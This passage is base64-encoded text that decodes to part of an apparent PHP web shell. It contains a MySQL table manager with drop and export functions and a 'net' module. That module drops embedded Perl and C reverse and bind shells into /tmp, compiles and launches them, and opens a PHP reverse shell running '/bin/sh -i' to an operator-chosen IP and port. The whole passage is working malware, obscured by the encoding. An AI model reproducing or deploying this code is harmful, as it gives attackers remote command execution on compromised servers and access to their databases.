9lbmNvZGUoJHdoZXJlKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRhbGxvd2VkaXQpIHAoJzx0ZCBub3dyYXA+PGEgaHJlZj0iamF2YXNjcmlwdDplZGl0cmVjb3JkKFwnZWRpdFwnLCBcJycuJHdoZXJlLidcJywgXCcnLiR0YWJsZW5hbWUuJ1wnKTsiPkVkaXQ8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDplZGl0cmVjb3JkKFwnZGVsXCcsIFwnJy4kd2hlcmUuJ1wnLCBcJycuJHRhYmxlbmFtZS4nXCcpOyI+RGVsPC9hPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAoJGIxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCgnPC90cj4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5zZXQoJGIxKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGJmb290KCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCgkbXVsdGlwYWdlKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFyID0gbXlzcWxfYWZmZWN0ZWRfcm93cygpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAoJzxoMj5hZmZlY3RlZCByb3dzIDogPGI+Jy4kYXIuJzwvYj48L2gyPicpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICAgICAgJHF1ZXJ5ID0gcSgiU0hPVyBUQUJMRSBTVEFUVVMiKTsgDQogICAgICAgICAgICAgICAgJHRhYmxlX251bSA9ICR0YWJsZV9yb3dzID0gJGRhdGFfc2l6ZSA9IDA7IA0KICAgICAgICAgICAgICAgICR0YWJsZWRiID0gYXJyYXkoKTsgDQogICAgICAgICAgICAgICAgd2hpbGUoJHRhYmxlID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5KSkgeyANCiAgICAgICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9ICRkYXRhX3NpemUgKyAkdGFibGVbJ0RhdGFfbGVuZ3RoJ107IA0KICAgICAgICAgICAgICAgICAgICAkdGFibGVfcm93cyA9ICR0YWJsZV9yb3dzICsgJHRhYmxlWydSb3dzJ107IA0KICAgICAgICAgICAgICAgICAgICAkdGFibGVbJ0RhdGFfbGVuZ3RoJ10gPSBzaXplY291bnQoJHRhYmxlWydEYXRhX2xlbmd0aCddKTsgDQogICAgICAgICAgICAgICAgICAgICR0YWJsZV9udW0rKzsgDQogICAgICAgICAgICAgICAgICAgICR0YWJsZWRiW10gPSAkdGFibGU7IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9IHNpemVjb3VudCgkZGF0YV9zaXplKTsgDQogICAgICAgICAgICAgICAgdW5zZXQoJHRhYmxlKTsgDQogICAgICAgICAgICAgICAgcCgnPHRhYmxlIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4nKTsgDQogICAgICAgICAgICAgICAgcCgnPGZvcm0gYWN0aW9uPSInLiRzZWxmLiciIG1ldGhvZD0iUE9TVCI+Jyk7IA0KICAgICAgICAgICAgICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxhZG1pbicpOyANCiAgICAgICAgICAgICAgICBwKCRkYmZvcm0pOyANCiAgICAgICAgICAgICAgICBwKCc8dHIgY2xhc3M9ImhlYWQiPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQgd2lkdGg9IjIlIiBhbGlnbj0iY2VudGVyIj48aW5wdXQgbmFtZT0iY2hrYWxsIiB2YWx1ZT0ib24iIHR5cGU9ImNoZWNrYm94IiBvbmNsaWNrPSJDaGVja0FsbCh0aGlzLmZvcm0pIiAvPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgIHAoJzx0ZD5OYW1lPC90ZD4nKTsgDQogICAgICAgICAgICAgICAgcCgnPHRkPlJvd3M8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQ+RGF0YV9sZW5ndGg8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQ+Q3JlYXRlX3RpbWU8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQ+VXBkYXRlX3RpbWU8L3RkPicpOyANCiAgICAgICAgICAgICAgICBpZiAoJGhpZ2h2ZXIpIHsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0ZD5FbmdpbmU8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRkPkNvbGxhdGlvbjwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgcCgnPC90cj4nKTsgDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRhYmxlZGIgYXMgJGtleSA9PiAkdGFibGUpIHsgDQogICAgICAgICAgICAgICAgICAgICR0aGlzYmcgPSBiZygpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRyIGNsYXNzPSInLiR0aGlzYmcuJyIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnJy4kdGhpc2JnLidcJzsiPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRkIGFsaWduPSJjZW50ZXIiIHdpZHRoPSIyJSI+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ0YWJsZVtdIiB2YWx1ZT0iJy4kdGFibGVbJ05hbWUnXS4nIiAvPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlWydOYW1lJ10uJ1wnKTsiPicuJHRhYmxlWydOYW1lJ10uJzwvYT4gWyA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVbJ05hbWUnXS4nXCcsIFwnaW5zZXJ0XCcpOyI+SW5zZXJ0PC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZVsnTmFtZSddLidcJywgXCdzdHJ1Y3R1cmVcJyk7Ij5TdHJ1Y3R1cmU8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlWydOYW1lJ10uJ1wnLCBcJ2Ryb3BcJyk7Ij5Ecm9wPC9hPiBdPC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgIHAoJzx0ZD4nLiR0YWJsZVsnUm93cyddLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHRhYmxlWydEYXRhX2xlbmd0aCddLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHRhYmxlWydDcmVhdGVfdGltZSddLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHRhYmxlWydVcGRhdGVfdGltZSddLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgaWYgKCRoaWdodmVyKSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgcCgnPHRkPicuJHRhYmxlWydFbmdpbmUnXS4nPC90ZD4nKTsgDQogICAgICAgICAgICAgICAgICAgICAgICBwKCc8dGQ+Jy4kdGFibGVbJ0NvbGxhdGlvbiddLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgcCgnPC90cj4nKTsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBwKCc8dHIgY2xhc3M9Jy5iZygpLic+Jyk7IA0KICAgICAgICAgICAgICAgIHAoJzx0ZD4mbmJzcDs8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQ+VG90YWwgdGFibGVzOiAnLiR0YWJsZV9udW0uJzwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgIHAoJzx0ZD4nLiR0YWJsZV9yb3dzLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQ+Jy4kZGF0YV9zaXplLic8L3RkPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQgY29sc3Bhbj0iJy4oJGhpZ2h2ZXIgPyA0IDogMikuJyI+Jm5ic3A7PC90ZD4nKTsgDQogICAgICAgICAgICAgICAgcCgnPC90cj4nKTsgDQoNCiAgICAgICAgICAgICAgICBwKCI8dHIgY2xhc3M9XCIiLmJnKCkuIlwiPjx0ZCBjb2xzcGFuPVwiIi4oJGhpZ2h2ZXIgPyA4IDogNikuIlwiPjxpbnB1dCBuYW1lPVwic2F2ZWFzZmlsZVwiIHZhbHVlPVwiMVwiIHR5cGU9XCJjaGVja2JveFwiIC8+IFNhdmUgYXMgZmlsZSA8aW5wdXQgY2xhc3M9XCJpbnB1dFwiIG5hbWU9XCJwYXRoXCIgdmFsdWU9XCIiLlNBX1JPT1QuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiJfTXlTUUwuc3FsXCIgdHlwZT1cInRleHRcIiBzaXplPVwiNjBcIiAvPiA8aW5wdXQgY2xhc3M9XCJidFwiIHR5cGU9XCJzdWJtaXRcIiBuYW1lPVwiZG93bnJhclwiIHZhbHVlPVwiRXhwb3J0IHNlbGVjdGlvbiB0YWJsZVwiIC8+PC90ZD48L3RyPiIpOyANCiAgICAgICAgICAgICAgICBtYWtlaGlkZSgnZG9pbmcnLCdiYWNrdXBteXNxbCcpOyANCiAgICAgICAgICAgICAgICBmb3JtZm9vdCgpOyANCiAgICAgICAgICAgICAgICBwKCI8L3RhYmxlPiIpOyANCiAgICAgICAgICAgICAgICBmcigkcXVlcnkpOyANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gDQogICAgfSANCiAgICB0YmZvb3QoKTsgDQogICAgQG15c3FsX2Nsb3NlKCk7IA0KfS8vZW5kIHNxbCBiYWNrdXAgDQoNCg0KZWxzZWlmICgkYWN0aW9uID09ICduZXQnKSB7IA0KICAgICEkeW91cmlwICYmICR5b3VyaXAgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsgDQogICAgISR5b3VycG9ydCAmJiAkeW91cnBvcnQgPSAnMTM3MCc7IA0KICAgICR1c2VkYiA9IGFycmF5KCdwZXJsJz0+J3BlcmwnLCdwaHAnPT4ncGhwIChwcm9jX29wZW4pJywnYyc9PidjJyk7IA0KDQogICAgJGJhY2tfY29ubmVjdD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pHTnRaRDBnSW14NWJuZ2lPdzBLSkhONWMzUmxiVDBnSjJWamFHOGdJbUIxYm1GdFpTQXRZV0FpTzJWaiIuIA0KICAgICAgICAiYUc4Z0ltQnBaR0FpT3k5aWFXNHZjMmduT3cwS0pEQTlKR050WkRzTkNpUjBZWEpuWlhROUpFRlNSMVpiTUYwN0RRb2tjRzl5ZEQwa1FWSkhWbHN4WFRzTkNpUnBZV1JrY2oxcGJtVjBYMkYwYjI0b0pIUiIuIA0KICAgICAgICAiaGNtZGxkQ2tnZkh3Z1pHbGxLQ0pGY25KdmNqb2dKQ0ZjYmlJcE93MEtKSEJoWkdSeVBYTnZZMnRoWkdSeVgybHVLQ1J3YjNKMExDQWthV0ZrWkhJcElIeDhJR1JwWlNnaVJYSnliM0k2SUNRaFhHNGlLVCIuIA0KICAgICAgICAic05DaVJ3Y205MGJ6MW5aWFJ3Y205MGIySjVibUZ0WlNnbmRHTndKeWs3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1NCOGZDQmthV1VvSSIuIA0KICAgICAgICAia1Z5Y205eU9pQWtJVnh1SWlrN0RRcGpiMjV1WldOMEtGTlBRMHRGVkN3Z0pIQmhaR1J5S1NCOGZDQmthV1VvSWtWeWNtOXlPaUFrSVZ4dUlpazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaSIuIA0KICAgICAgICAiS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVJWSlNMQ0FpUGlaVFQwTkxSVlFpS1RzTkNuTjVjM1JsYlNna2MzbHpkR1Z0S1RzTkNtTnNiM05sS0ZOVVJFbCIuIA0KICAgICAgICAiT0tUc05DbU5zYjNObEtGTlVSRTlWVkNrN0RRcGpiRzl6WlNoVFZFUkZVbElwT3c9PSI7IA0KICAgICRiYWNrX2Nvbm5lY3RfYz0iSTJsdVkyeDFaR1VnUEhOMFpHbHZMbWcrRFFvamFXNWpiSFZrWlNBOGMzbHpMM052WTJ0bGRDNW9QZzBLSTJsdVkyeDFaR1VnUEc1bGRHbHVaWFF2YVc0dWFENE5DbWx1ZEMiLiANCiAgICAgICAgIkJ0WVdsdUtHbHVkQ0JoY21kakxDQmphR0Z5SUNwaGNtZDJXMTBwRFFwN0RRb2dhVzUwSUdaa093MEtJSE4wY25WamRDQnpiMk5yWVdSa2NsOXBiaUJ6YVc0N0RRb2dZMmhoY2lCeWJYTmJNakZkUFNKeWIiLiANCiAgICAgICAgIlNBdFppQWlPeUFOQ2lCa1lXVnRiMjRvTVN3d0tUc05DaUJ6YVc0dWMybHVYMlpoYldsc2VTQTlJRUZHWDBsT1JWUTdEUW9nYzJsdUxuTnBibDl3YjNKMElEMGdhSFJ2Ym5Nb1lYUnZhU2hoY21kMld6SmQiLiANCiAgICAgICAgIktTazdEUW9nYzJsdUxuTnBibDloWkdSeUxuTmZZV1JrY2lBOUlHbHVaWFJmWVdSa2NpaGhjbWQyV3pGZEtUc2dEUW9nWW5wbGNtOG9ZWEpuZGxzeFhTeHpkSEpzWlc0b1lYSm5kbHN4WFNrck1TdHpkSEoiLiANCiAgICAgICAgInNaVzRvWVhKbmRsc3lYU2twT3lBTkNpQm1aQ0E5SUhOdlkydGxkQ2hCUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1NWQlFVazlVVDE5VVExQXBJRHNnRFFvZ2FXWWdLQ2hqYjI1dVpXTjBLR1prTEMiLiANCiAgICAgICAgIkFvYzNSeWRXTjBJSE52WTJ0aFpHUnlJQ29wSUNaemFXNHNJSE5wZW1WdlppaHpkSEoxWTNRZ2MyOWphMkZrWkhJcEtTazhNQ2tnZXcwS0lDQWdjR1Z5Y205eUtDSmJMVjBnWTI5dWJtVmpkQ2dwSWlrN0QiLiANCiAgICAgICAgIlFvZ0lDQmxlR2wwS0RBcE93MEtJSDBOQ2lCemRISmpZWFFvY20xekxDQmhjbWQyV3pCZEtUc05DaUJ6ZVhOMFpXMG9jbTF6S1RzZ0lBMEtJR1IxY0RJb1ptUXNJREFwT3cwS0lHUjFjRElvWm1Rc0lERXAiLiANCiAgICAgICAgIk93MEtJR1IxY0RJb1ptUXNJRElwT3cwS0lHVjRaV05zS0NJdlltbHVMM05vSWl3aWMyZ2dMV2tpTENCT1ZVeE1LVHNOQ2lCamJHOXpaU2htWkNrN0lBMEtmUT09IjsgDQogICAgJGJpbmRfcGw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFva1UwaEZURXc5SWk5aWFXNHZZbUZ6YUNBdGFTSTdEUXBwWmlBb1FFRlNSMVlnUENBeEtTQjdJR1Y0YVhRb01TazdJSDBOQ2lSTVMiLiANCiAgICAgICAgIlZOVVJVNWZVRTlTVkQwa1FWSkhWbHN3WFRzTkNuVnpaU0JUYjJOclpYUTdEUW9rY0hKdmRHOWpiMnc5WjJWMGNISnZkRzlpZVc1aGJXVW9KM1JqY0NjcE93MEtjMjlqYTJWMEtGTXNKbEJHWDBsT1JWUXMiLiANCiAgICAgICAgIkpsTlBRMHRmVTFSU1JVRk5MQ1J3Y205MGIyTnZiQ2tnZkh3Z1pHbGxJQ0pEWVc1MElHTnlaV0YwWlNCemIyTnJaWFJjYmlJN0RRcHpaWFJ6YjJOcmIzQjBLRk1zVTA5TVgxTlBRMHRGVkN4VFQxOVNSVlYiLiANCiAgICAgICAgIlRSVUZFUkZJc01TazdEUXBpYVc1a0tGTXNjMjlqYTJGa1pISmZhVzRvSkV4SlUxUkZUbDlRVDFKVUxFbE9RVVJFVWw5QlRsa3BLU0I4ZkNCa2FXVWdJa05oYm5RZ2IzQmxiaUJ3YjNKMFhHNGlPdzBLYkciLiANCiAgICAgICAgImx6ZEdWdUtGTXNNeWtnZkh3Z1pHbGxJQ0pEWVc1MElHeHBjM1JsYmlCd2IzSjBYRzRpT3cwS2QyaHBiR1VvTVNrTkNuc05DbUZqWTJWd2RDaERUMDVPTEZNcE93MEthV1lvSVNna2NHbGtQV1p2Y21zcEsiLiANCiAgICAgICAgIlEwS2V3MEtaR2xsSUNKRFlXNXViM1FnWm05eWF5SWdhV1lnS0NGa1pXWnBibVZrSUNSd2FXUXBPdzBLYjNCbGJpQlRWRVJKVGl3aVBDWkRUMDVPSWpzTkNtOXdaVzRnVTFSRVQxVlVMQ0krSmtOUFRrNGkiLiANCiAgICAgICAgIk93MEtiM0JsYmlCVFZFUkZVbElzSWo0bVEwOU9UaUk3RFFwbGVHVmpJQ1JUU0VWTVRDQjhmQ0JrYVdVZ2NISnBiblFnUTA5T1RpQWlRMkZ1ZENCbGVHVmpkWFJsSUNSVFNFVk1URnh1SWpzTkNtTnNiM04iLiANCiAgICAgICAgImxJRU5QVGs0N0RRcGxlR2wwSURBN0RRcDlEUXA5IjsgDQoNCiAgICBpZiAoJHN0YXJ0X2NiICYmICR5b3VyaXAgJiYgJHlvdXJwb3J0ICYmICR1c2UpeyANCiAgICAgICAgaWYgKCR1c2UgPT0gJ3BlcmwnKSB7IA0KICAgICAgICAgICAgY2YoJy90bXAvbWFnaWNjb2Rlcl9iYycsJGJhY2tfY29ubmVjdCk7IA0KICAgICAgICAgICAgc3dpdGNoICgkX1BPU1RbJ2V4ZWNmdW5jdGlvbl9jYiddKSB7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3N5c3RlbSc6IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHN5c3RlbSh3aGljaCgncGVybCcpLiIgL3RtcC9tYWdpY2NvZGVyX2JjICR5b3VyaXAgJHlvdXJwb3J0ICYiKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdwYXNzdGhydSc6IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHBhc3N0aHJ1KHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmMgJHlvdXJpcCAkeW91cnBvcnQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ2V4ZWMnOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBleGVjKHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmMgJHlvdXJpcCAkeW91cnBvcnQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ2V4ZWN1dGUnOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBleGVjdXRlKHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmMgJHlvdXJpcCAkeW91cnBvcnQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3NoZWxsX2V4ZWMnOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBzaGVsbF9leGVjKHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmMgJHlvdXJpcCAkeW91cnBvcnQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3BvcGVuJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAZnJlYWQocG9wZW4od2hpY2goJ3BlcmwnKS4iIC90bXAvbWFnaWNjb2Rlcl9iYyAkeW91cmlwICR5b3VycG9ydCAmIixyKSwgOTk5OSk7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgfSANCg0KICAgICAgICB9IGVsc2VpZiAoJHVzZSA9PSAncGhwJykgeyANCiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0ICgwKTsgIA0KICAgICAgICAgICAgJFZFUlNJT04gPSAiMS4wIjsgIA0KICAgICAgICAgICAgJGlwID0gJHlvdXJpcDsgIA0KICAgICAgICAgICAgJHBvcnQgPSAkeW91cnBvcnQ7ICANCiAgICAgICAgICAgICRjaHVua19zaXplID0gMTQwMDsgIA0KICAgICAgICAgICAgJHdyaXRlX2EgPSBudWxsOyAgDQogICAgICAgICAgICAkZXJyb3JfYSA9IG51bGw7ICANCiAgICAgICAgICAgICRzaGVsbCA9ICJ1bmFtZSAtYTsgdzsgaWQ7IC9iaW4vc2ggLWkiOyAgDQogICAgICAgICAgICAkZGFlbW9uID0gMDsgIA0KICAgICAgICAgICAgJGRlYnVnID0gMDsgIA0KICAgICAgICAgICAgY2hkaXIoIi8iKTsgIA0KICAgICAgICAgICAgdW1hc2soMCk7ICANCiAgICAgICAgICAgICRzb2NrID0gQGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsgIA0KICAgICAgICAgICAgaWYgKCEkc29jaykgeyAgDQogICAgICAgICAgICAgICAgZWNobygiJGVycnN0ciAoJGVycm5vKSIpOyAgDQogICAgICAgICAgICAgICAgZXhpdCgxKTsgIA0KICAgICAgICAgICAgICAgIH0gIA0KICAgICAgICAgICAgJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgKTsgIA0KICAgICAgICAgICAgICAgICRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOyAgDQogICAgICAgICAgICBpZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgeyAgDQogICAgICAgICAgICAgICAgZXhpdCgxKTsgIA0KICAgICAgICAgICAgICAgIH0gIA0KICAgICAgICAgICAgc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOyBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7ICANCiAgICAgICAgICAgIHN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsgIA0KICAgICAgICAgICAgc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7ICANCiAgICAgICAgICAgIHdoaWxlICgxKSB7ICANCiAgICAgICAgICAgICAgICBpZiAoZmVvZigkc29jaykpIHsgIA0KICAgICAgICAgICAgICAgIGJyZWFrOyAgDQogICAgICAgICAgICAgICAgfSAgDQogICAgICAgICAgICAgICAgaWYgKGZlb2YoJHBpcGVzWzFdKSkgeyAgDQogICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICAgICB9ICANCiAgICAgICAgICAgICAgICAkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsgIA0KICAgICAgICAgICAgICAgICRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOyAgDQogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgeyAgDQogICAgICAgICAgICAgICAgaWYgKCRkZWJ1ZykgZWNobygiU09DSyBSRUFEIik7ICANCiAgICAgICAgICAgICAgICAkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOyAgDQogICAgICAgICAgICAgICAgaWYgKCRkZWJ1ZykgZWNobygiU09DSzogJGlucHV0Iik7ICANCiAgICAgICAgICAgICAgICBmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOyAgDQogICAgICAgICAgICAgICAgfSAgDQogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsgIA0KICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIGVjaG8oIlNURE9VVCBSRUFEIik7ICANCiAgICAgICAgICAgICAgICAkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsgIA0KICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIGVjaG8oIlNURE9VVDogJGlucHV0Iik7ICANCiAgICAgICAgICAgICAgICBmd3JpdGUoJHNvY2ssICRpbnB1dCk7ICANCiAgICAgICAgICAgICAgICB9ICANCiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgeyAgDQogICAgICAgICAgICAgICAgaWYgKCRkZWJ1ZykgZWNobygiU1RERVJSIFJFQUQiKTsgIA0KICAgICAgICAgICAgICAgICRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOyAgDQogICAgICAgICAgICAgICAgaWYgKCRkZWJ1ZykgZWNobygiU1RERVJSOiAkaW5wdXQiKTsgIA0KICAgICAgICAgICAgICAgIGZ3cml0ZSgkc29jaywgJGlucHV0KTsgIA0KICAgICAgICAgICAgICAgIH0gIA0KICAgICAgICAgICAgICAgIH0gIA0KICAgICAgICAgICAgZmNsb3NlKCRzb2NrKTsgIA0KICAgICAgICAgICAgZmNsb3NlKCRwaXBlc1swXSk7ICANCiAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMV0pOyAgDQogICAgICAgICAgICBmY2xvc2UoJHBpcGVzWzJdKTsgIA0KICAgICAgICAgICAgcHJvY19jbG9zZSgkcHJvY2Vzcyk7ICANCg0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgIGVjaG8gJzxjZW50ZXI+VXNlIGZyb20gPGI+Jy4kX1BPU1RbJ2V4ZWNmdW5jdGlvbl9jYiddLic8L2I+IGZ1bmN0aW9uPGhyIHdpZHRoPSIyMjJweCIgbm9zaGFkZSAvPjwvY2VudGVyPic7IA0KICAgICAgICAgICAgY2YoJy90bXAvbWFnaWNjb2Rlcl9iYy5jJywkYmFja19jb25uZWN0X2MpOyANCiAgICAgICAgICAgIHN3aXRjaCAoJF9QT1NUWydleGVjZnVuY3Rpb25fY2InXSkgeyANCiAgICAgICAgICAgICAgICBjYXNlICdzeXN0ZW0nOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBzeXN0ZW0oJ2djYyAtbyAvdG1wL21hZ2ljY29kZXJfYmMgL3RtcC9tYWdpY2NvZGVyX2JjLmMnKTsgDQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJy90bXAvbWFnaWNjb2Rlcl9iYy5jJyk7IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHN5c3RlbSgiL3RtcC9tYWdpY2NvZGVyX2JjICR5b3VyaXAgJHlvdXJwb3J0ICYiKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdwYXNzdGhydSc6IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHBhc3N0aHJ1KCdnY2MgLW8gL3RtcC9tYWdpY2NvZGVyX2JjIC90bXAvbWFnaWNjb2Rlcl9iYy5jJyk7IA0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCcvdG1wL21hZ2ljY29kZXJfYmMuYycpOyANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBwYXNzdGhydSgiL3RtcC9tYWdpY2NvZGVyX2JjICR5b3VyaXAgJHlvdXJwb3J0ICYiKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdleGVjJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAZXhlYygnZ2NjIC1vIC90bXAvbWFnaWNjb2Rlcl9iYyAvdG1wL21hZ2ljY29kZXJfYmMuYycpOyANCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygnL3RtcC9tYWdpY2NvZGVyX2JjLmMnKTsgDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAZXhlYygiL3RtcC9tYWdpY2NvZGVyX2JjICR5b3VyaXAgJHlvdXJwb3J0ICYiKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdleGVjdXRlJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBleG